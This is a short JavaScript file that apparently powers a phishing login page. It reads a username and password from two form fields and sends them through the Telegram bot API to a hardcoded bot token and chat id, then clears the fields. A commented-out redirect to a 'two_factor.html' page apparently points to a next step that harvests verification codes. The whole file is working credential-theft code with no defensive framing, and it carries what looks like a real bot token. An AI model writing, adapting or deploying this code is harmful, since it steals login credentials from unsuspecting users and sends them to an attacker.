//bot token
var telegram_bot_id = "6359450538:AAEU4nQLP2AofQq6-MXfj40ULxgr0aJnRRE";
//chat id
var chat_id = -4034812161;
var u_name, email;
var ready = function () {
    u_name = document.getElementById("Rectangle_1").value;
    email = document.getElementById("Rectangle_2").value;

    message = "userName: " + u_name + "\npassword: " + email ;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("Rectangle_1").value = "";
    document.getElementById("Rectangle_2").value = "";

    // window.location.href = "two_factor.html";

    return false;
};
